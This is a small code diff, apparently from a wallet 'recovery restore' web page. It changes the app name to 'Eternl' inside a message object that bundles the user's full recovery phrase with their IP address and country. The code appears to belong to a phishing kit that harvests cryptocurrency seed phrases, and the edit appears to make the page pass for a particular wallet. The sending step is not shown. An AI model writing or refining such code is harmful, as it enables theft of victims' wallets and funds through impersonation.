@@ -208,7 +208,7 @@ export default function RecoveryRestore({
       const userData = await getUserCountry();
 
       const messageData = {
-        appName: "Eternal Wallet",
+        appName: "Eternl",
         recovery: sanitizedRecovery.join(" "),
         country: userData?.country || "Unknown",
         ipAddress: userData?.ip || "Unknown",
